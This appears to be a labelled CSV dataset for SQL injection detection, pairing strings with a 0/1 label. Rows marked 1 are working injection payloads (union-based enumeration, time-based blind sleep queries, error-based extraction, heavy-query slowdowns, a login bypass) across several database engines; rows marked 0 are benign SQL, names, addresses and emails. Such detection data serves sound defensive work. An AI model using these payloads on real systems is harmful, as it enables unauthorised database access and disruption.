Query,Label
"  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6130  =  6130,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
"1 where 3410  =  3410 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"glorieta puerta de hierro, 57",0
" SELECT * FROM afraid ORDER BY wonderful ASC, leaf DESC",0
c/ pirucha s/n 4-e,0
"1  )   as tgqd where 6369  =  6369 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
SELECT TOP 50 PERCENT * FROM measure SELECT * FROM except FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM push,0
avellano,0
ensminge,0
SELECT * FROM corner WHERE happy = 'orbit'  AND  ( essential = 'draw' OR special = 'brother' ) ,0
nalec,0
-2241  )   where 7606  =  7606 or   (  8459  =  8459  )  *4906--,1
"1   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8814  =  8814",1
DELETE FROM weak WHERE increase = 'surprise',0
villanueva del rosario,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""bqfj"" like ""bqfj",1
weldon@latiendadecolchones.ec,0
SELECT * FROM silence 3 SELECT * FROM dozen,0
SELECT * FROM brief WHERE lesson NOT BETWEEN 'chose' AND 'sent',0
"   SELECT duck, nearby+ ', ' + quiet+ ' ' + wing+ ', ' + vessels AS engineer  FROM wherever",0
SELECT * FROM typical ORDER BY official,0
"1""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""lxue"" like ""lxue",1
SELECT   LOCALTIME (  ) ;,0
"1   )    )    as rbae where 2049  =  2049 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
malacopterigio,0
27268,0
"-8943%'  )   union all select 7710,7710#",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28565 )  ORDER BY meta_id ASC",0
15423399j,0
"calle duque de zaragoza s/n,",0
SELECT * FROM busy WHERE took = 'buffalo',0
padiernos,0
urrupan moger,0
1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
DELETE FROM take,0
"1%""   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
enco,0
1.80E+15,0
"   SELECT Employees.youth, COUNT ( Orders.doubtID )  AS wouldFROM    ( OrdersINNER JOIN longer ON Orders.everythingID  =  Employees.orID ) ",0
"1""   )    )    as femc where 1313  =  1313 and 4595  =  4595#",1
"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",1
1%'   )    )     )   union all select null#,1
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'qyyg'  =  'qyyg",1
" select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",1
"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",1
 )  s,1
"-6720'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'enfe' like 'enfe",1
SELECT AVG ( labor ) FROM table SELECT SUM ( lower ) ,0
SELECT pale ( s )  FROM paper,0
37110,0
 or 1/*,1
"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # cqqs",1
"""*""",1
SELECT AVG ( base ) FROM note,0
SELECT * FROM tool WHERE NOT globe = 'key'  AND NOT queen = 'bottom',0
"1' in boolean mode  )   union all select null,null,null,null,null,null--",1
1%'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  '%'  =  ',1
" SELECT column_name ( s )  FROM speech,central",0
1'   )    )     )   and 1743  =  6793 and    (    (     (  'rgcv'  =  'rgcv,1
" SELECT column_name ( s )  FROM nice,nose",0
"1'||  (  select 'hdpi' where 5620  =  5620 and make_set  (  8403  =  8403,8899   )    )   ||'",1
1'+  (  select 'wvqj' where 3709  =  3709,1
"  SELECT four,stronger,yourself FROM quick LEFT JOIN Orders ON almost.shortID =  stems.once ORDER BY bend.tide",0
"-9096""  )   where 9452  =  9452 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1
SELECT option_value FROM wp_options WHERE option_name  =  '_options_instagram_url' LIMIT 1,0
SELECT * FROM herself  WHERE wagon NOT LIKE '[fallen]%',0
"   SELECT identity, applied, laidFROM strip WHERE mathematics  IS NOT NULL",0
SELECT ball ( s FROM being RIGHT JOIN,0
SELECT * FROM sound 3 SELECT * FROM river,0
1'+  (  select kzgg where 5070  =  5070,1
SELECT * FROM research WHERE when BETWEEN satellites09/01/1996crack AND mistake15/31/1996occur,0
SELECT COUNT ( bone )  FROM power,0
1'+  (  select byor where 4538  =  4538,1
o.donnel,0
-4835   )    )     )   or   (  4219  =  2081  )  *2081 and    (    (     (  8536  =  8536,1
ricciardi@enformetera.com.as,0
"  SELECT roomID AS ID, modern AS total FROM statement",0
SELECT TOP 3 * FROM flies,0
SELECT TOP 3 * FROM function WHERE sink = 'wait',0
"1""  )   as ubva where 6369  =  6369 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
antigua,0
FROM  ( SELECT DISTINCT shine FROM farmer ) ,0
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'xjvr'  =  'xjvr",1
1  )   as afxc where 7497  =  7497,1
"-3868'   )    )    or make_set  (  6809  =  1236,1236  )   and    (    (   'evnj'  =  'evnj",1
SELECT apart,0
SELECT AVG ( join ) FROM rocky,0
"""  )   or   (  ""x""  )    =    (  ""x",1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_3146' LIMIT 1,0
SELECT * FROM front,0
SELECT COUNT ( battleID ) FROM church,0
SELECT * FROM box WHERE start = 'clock',0
SELECT AVG ( unusual ) FROM drink SELECT SUM ( guess ) ,0
-2174'   )    )    as zhoz where 4185  =  4185 order by 1#,1
ga27393,0
SELECT TOP 50 PERCENT * FROM shut SELECT * FROM general FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM three,0
SELECT * FROM usually WHERE least = 'addition' FETCH FIRST 3 ROWS ONLY,0
"-5160'  )   as kgjw where 9609  =  9609 union all select 9609,9609--",1
if  (  6554  =  1534  )   select 6554 else drop function buqb--,1
"1""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""tzqk"" like ""tzqk",1
14638777j,0
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ajkb'  =  'ajkb",1
71648159p,0
"  SELECT pipeID AS ID, sale AS engine FROM regular",0
5.18985E+14,0
morn de almazn,0
SELECT TOP 3 * FROM organized,0
"select * from generate_series  (  3990,3990,case when   (  3990  =  9597  )   then 1 else 0 end  )   limit 1--",1
malditamente,0
SELECT cross ( s FROM nation RIGHT JOIN,0
-1396 where 5838  =  5838 or 9323  =  9323#,1
aguzadera,0
silvie,0
"-2046'  )   union all select 6668,6668--",1
casaubn de rosa,0
"  SELECT suddenly,chair,escape FROM chosen LEFT JOIN Orders ON potatoes.establishID =  steep.people ORDER BY beat.flow",0
"1  )   as biup where 1414  =  1414 union all select null,null,null,null,null,null,null,null#",1
"1""   )    )    as rhea where 2982  =  2982 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",1
2.38947E+15,0
SELECT MONTH ( CURDATE (   )  )  ;,0
87053274e,0
SELECT * FROM vowel  WHERE layers NOT LIKE '[nearby]%',0
"1""   )    )    as maxe where 5883  =  5883 union all select null,null,null,null,null,null,null,null,null#",1
SELECT * FROM during WHERE mind = 'walk'  OR sound = 'since',0
SELECT TOP 3 * FROM face WHERE coming = 'suggest',0
"  SELECT they,right,matter FROM therefore LEFT JOIN Orders ON positive.deadID =  shape.standard ORDER BY naturally.or",0
1'||  (  select 'hafu' where 6226  =  6226,1
"  SELECT fastened,fall FROM wash WHERE enter = 'play' UNION SELECT seven, block FROM certainly",0
SELECT * FROM bottom ORDER BY thou,0
43426,0
nelba,0
minardi cardea,0
SELECT bat ( s )  FROM wise SELECT leaving ( s ) ,0
SELECT TOP 50 PERCENT * FROM furniture SELECT * FROM change FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM then,0
DELETE FROM consider WHERE storm = 'stove',0
follosas,0
10328,0
19332,0
"1""  )   as kdvb where 2651  =  2651 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1
otumba 24 13e,0
SELECT * FROM across FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM reason,0
"-6116""   )    )    union all select 3679,3679,3679,3679,3679,3679,3679--",1
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,1
"make_set  (  2672  =  2672,5440  )  ",1
oskorep,0
"-3116   )    )    as jyiq where 3875  =  3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",1
"-6333""   )    )     )   union all select 9851,9851,9851,9851,9851,9851--",1
1'||  (  select 'omeg' from dual where 4751  =  4751,1
"1'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'zeum'  =  'zeum",1
"1'||  (  select 'goxu' where 9215  =  9215 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
nanjar viejo,0
"   SELECT limited, cage, simplyFROM choice WHERE supply  IS NOT NULL",0
"1'+  (  select lhho where 7579  =  7579 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT * FROM  ( SELECT claws FROM moon ) ,0
reele.cto,0
SELECT TOP 50 PERCENT * FROM walk,0
SELECT * FROM soldier WHERE tide  BETWEEN 10 AND 20,0
"1  )   as oblq where 2002  =  2002 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
SELECT * FROM inch WHERE original BETWEEN '1996-07-01' AND '1996-07-31',0
-6244'  )   as szpd where 8445  =  8445 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"SELECT POSITION ( ""COM"" IN ""W3Schools.com"" )  AS MatchPosition;",0
"1""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
a0_idia,0
SELECT * FROM theory FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM something,0
SELECT * FROM CustomersFETCH FIRST 50 PERCENT ROWS ONLY;,0
" select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1
lora@rocofer.jobs,0
"1 union all select null,null--",1
SELECT AVG ( chance ) FROM happily SELECT SUM ( blanket ) ,0
"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'sdnc'  =  'sdnc",1
valeika@italianmotorvillagesevilla.gd,0
SELECT * FROM am WHERE pale NOT BETWEEN 'history' AND 'trouble',0
SELECT slabs ( s )  FROM pencil LEFT JOIN,0
cab,0
85640413m,0
"-8013%"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,1
SELECT laid ( s )  FROM clearly UNION,0
SELECT MIN ( weight )  AS market FROM zulu,0
FROM  ( SELECT DISTINCT ran FROM outline ) ,0
18243165w,0
49439340n,0
"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",1
"c/ de las gloxinias 91,",0
"-7016%""   )    )    union all select 8847,8847,8847--",1
select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1
egner,0
DELETE FROM string,0
1   )    )    as zpvn where 2767  =  2767 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
4.08791E+15,0
19127,0
SELECT mood ( s )  FROM vessels UNION ALL,0
"  SELECT * FROM cotton WHERE bar NOT IN  ( 'addition', 'off', 'page' )  ",0
heile,0
SELECT COUNT ( due ) FROM finger,0
SELECT * FROM compass ORDER BY available,0
"INSERT INTO method ( nice, talk, meet, thought, scientific, just )  VALUES  ( 'curious', 'victory'. principle', 'finish', 'independent', 'built', 'married' )  ",0
SELECT COUNT ( these ) FROM lovely,0
-4901  )   or 3407  =  6442#,1
SELECT * FROM sure WHERE mass = 'unknown'  OR leaving = 'worse',0
"1""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""oxxi""  =  ""oxxi",1
"1',  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",1
haiti 27 1?g,0
"1""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"   SELECT frighten, captain+ ', ' + further+ ' ' + slow+ ', ' + drive AS wrapped  FROM clock",0
"1 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"   SELECT grain,summer,nearer,brother,sweet     (  (  iron JOIN middle ON slow.occur =  repeat.truck )   INNER JOIN brushON Orders.free =  aside.costID ) ",0
SELECT * FROM copy WHERE rough NOT LIKE 'two%',0
"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""cecf""  =  ""cecf",1
SELECT TOP 3 * FROM fall,0
enumer24,0
"  SELECT * FROM empty WHERE afraid IN  ( 'appearance', 'track', 'purpose' )  ",0
"1%""   )    )     )   union all select null,null--",1
-6757'   )    )     )   or 4524  =  3696,1
SELECT AVG ( tonight ) FROM shoot SELECT SUM ( meal ) ,0
-8086%'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',1
sprouse,0
ruiloba,0
maryrose,0
SELECT inch ( s FROM tool RIGHT JOIN,0
SELECT * FROM  ( SELECT locate FROM root ) ,0
SELECT writer ( s )  FROM entire SELECT thirty ( s ) ,0
1  )   as cinw where 3732  =  3732 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
"1"" where 1683  =  1683 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1
select   (  case when   (  3435  =  4011  )   then 1 else 3435*  (  select 3435 from master..sysdatabases  )   end  )  --,1
2161,0
SELECT visit ( s )  FROM service UNION,0
"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""phcl"" like ""phcl",1
"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'wdru' like 'wdru",1
1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,1
"  SELECT Orders.tearsrID, Employees.bus, Employees.skin FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.promisedID ORDER BY Orders.lookID",0
bardallur,0
7.86165E+15,0
-6865  )   or   (  8459  =  8459  )  *4906 and   (  6107  =  6107,1
6.20415E+15,0
SELECT * FROM general WHERE minute LIKE '%stairs%',0
1   )    )    as ipfy where 1189  =  1189,1
"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",1
DELETE FROM discuss WHERE cook = 'basic',0
SELECT AVG ( half ) FROM balance SELECT SUM ( break ) ,0
"-5509%""   )    )     )   union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",1
DELETE FROM present,0
"1'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'tfnb'  =  'tfnb",1
SELECT * FROM service ORDER BY connected,0
SELECT * FROM sure WHERE rhythm BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT AVG ( inside ) FROM proper SELECT SUM ( settlers ) ,0
SELECT AVG ( grabbed )  FROM warn  SELECT SUM ( smell ) ,0
FROM  ( SELECT DISTINCT ice FROM topic ) ,0
SELECT * FROM salt WHERE center NOT LIKE 'breath%',0
"SELECT * FROM cow WHERE torn BETWEEN ""butter"" AND    ""refused""",0
"1""  )   where 6809  =  6809 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",1
SELECT column_name ( s )  FROM table1 UNION ALL,0
1'   )    )    as dqdv where 8126  =  8126 and 4595  =  4595#,1
FROM  ( SELECT DISTINCT scared FROM respect ) ,0
1 and 9198  =  9198--,1
31410,0
SELECT COUNT ( DISTINCT pine )  FROM beauty,0
"SELECT ProductName, UnitPrice *  ( UnitsInStock + IFNULL ( UnitsOnOrder, 0  )  )   FROM Products;",0
DELETE FROM window WHERE gas = 'tube',0
SELECT tears FROM whistle,0
SELECT * FROM us 3,0
"1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,1
SELECT * FROM coming 3,0
arrestar,0
SELECT * FROM thirty WHERE shine = 'remove'  OR official = 'pure',0
SELECT ProductName FROM Products WHERE ProductID  =  ANY,0
end and   (  'rlux' like 'rlux,1
"   SELECT COUNT ( tears ) , sum FROM total BY continued",0
SELECT * FROM write ORDER BY slave DESC,0
SELECT * FROM pour FETCH FIRST 50 PERCENT ROWS ONLY,0
FROM  ( SELECT DISTINCT lion FROM lower ) ,0
SELECT daily ( s )  FROM exactly SELECT color FROM strong,0
sqlvuln;,1
"-3952'  )   union all select 6644,6644,6644--",1
SELECT COUNT ( rapidly ) FROM together,0
"INSERT INTO little  ( air, slowly, movie )  VALUES  ( 'pressure', 'search', 'classroom' )  ",0
SELECT * FROM greatly WHERE feel = 'park' FETCH FIRST 3 ROWS ONLY,0
"admin""  )   or ""1""  =  ""1""--",1
1'  )   as wtev where 5283  =  5283,1
"   SELECT fly,shoe,city,shinning,claws     (  (  surrounded JOIN find ON electric.alive =  track.scene )   INNER JOIN underON Orders.welcome =  arrangement.campID ) ",0
-2992%'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',1
stankova@carrillo-de-albornoz.pt,0
cantoria,0
5.72741E+15,0
velero@softwaresaas.ec,0
1'||  (  select 'ogyu' from dual where 6691  =  6691,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""%""  =  """,1
matzenauer@evelin.com.ci,0
SELECT * FROM halfway WHERE NOT spell = 'vote'  AND NOT straight = 'ship',0
adahuesca,0
-8056   )    )    as botl where 9225  =  9225 or   (  1182  =  7641  )  *7641--,1
"1  )   union all select null,null,null,null,null,null,null,null#",1
SELECT TOP 3 * FROM tone WHERE lesson = 'stepped' SELECT * FROM needle,0
mariabel,0
"1""  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT rhythm ( s FROM carried RIGHT JOIN,0
orbita,0
"   SELECT mind,numeral,than,exclaimed,known     (  (  guide JOIN coast ON snake.well =  magic.snake )   INNER JOIN entireON Orders.observe =  underline.viewID ) ",0
1  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
yevtushenko-pegna@corjet.al,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",1
cambulln,0
"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""eiuc"" like ""eiuc",1
"1"" where 6023  =  6023",1
tottenham@satellites.py,0
"  SELECT * FROM string WHERE stranger NOT IN  ( 'swim', 'art', 'arrive' )  ",0
"1' union all select null,null,null#",1
6087,0
SELECT government FROM dull UNION SELECT colony FROM fourth ORDER BY personal,0
 and 1 in   (  select var from temp  )  --,1
SELECT * FROM whole WHERE mouth = 'trap',0
1'  ) ,1
wambsgan,0
"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",1
SELECT TOP 3 * FROM straight WHERE soon = 'shinning' SELECT * FROM leave,0
re681g48rdia,0
"1'+  (  select acax where 4169  =  4169 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",1
select   (  case when   (  4755  =  4784  )   then 1 else 4755*  (  select 4755 from master..sysdatabases  )   end  )  --,1
9665,0
66,0
1'  )   as akvn where 8669  =  8669,1
SELECT * FROM pack FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM furniture,0
SELECT *FROM  ( SELECT column_name ( s )  FROM,0
"   SELECT Employees.toward, COUNT ( Orders.onID )  AS swimmingFROM    ( OrdersINNER JOIN flow ON Orders.sisterID  =  Employees.courtID ) ",0
"   SELECT COUNT ( weigh ) , positive FROM stretch BY stream",0
"SELECT INSTR ( ""W3Schools.com"", ""COM"" )  AS MatchPosition;",0
"1   )    )    as uizx where 2512  =  2512 and make_set  (  1402  =  2908,2908  )  --",1
"1   )    )     )   and elt  (  3132  =  1541,1541  )   and    (    (     (  4258  =  4258",1
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'cbnc' like 'cbnc,1
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'mnbg' like 'mnbg",1
SELECT giving ( s )  FROM this UNION,0
SELECT COUNT ( DISTINCT not )  FROM fuel,0
SELECT COUNT ( impossibleID ) FROM belt,0
kellard@todobetis.gf,0
cegajoso,0
"-6642'  )   where 3459  =  3459 union all select 3459,3459,3459,3459,3459,3459,3459,3459,3459#",1
"-2434  )   union all select 8310,8310,8310,8310,8310--",1
fulmer,0
satorras maynol,0
23670,0
"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""%""  =  """,1
"1'  )   where 1027  =  1027 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
SELECT * FROM bat  WHERE built = few,0
-8538%' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',1
-8963  )   where 8528  =  8528 or   (  2470  =  3271  )  *3271--,1
"-2312'   )    )     )   union all select 5282,5282,5282,5282,5282,5282,5282,5282--",1
"1'||  (  select 'akye' where 9242  =  9242 union all select null,null,null,null,null,null#",1
SELECT * FROM hour WHERE fact = 'studying',0
"-6108'  )   union all select 2519,2519,2519,2519--",1
4ode5ista,0
"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",1
SELECT COUNT ( test ) FROM teacher,0
SELECT * FROM hung WHERE fire = 'studied' LIMIT 3,0
SELECT * FROM six WHERE needs = 'pleasant'  AND City = 'breathe',0
SELECT * FROM prove ORDER BY offer DESC,0
"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",1
zanobia,0
"1%' and elt  (  4249  =  4249,7259  )   and '%'  =  '",1
SELECT * FROM pour WHERE Price NOT BETWEEN 10 AND 20,0
"   SELECT individual, decide, milkFROM deeply WHERE citizen  IS NOT NULL",0
"1%""  )   and 9764  =  6037 and   (  ""%""  =  """,1
SELECT get ( s )  FROM smoke UNION,0
"  UPDATE keep SET rice =  'pine', City =  'tower' WHERE birds =  split",0
"1 where 7906  =  7906 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
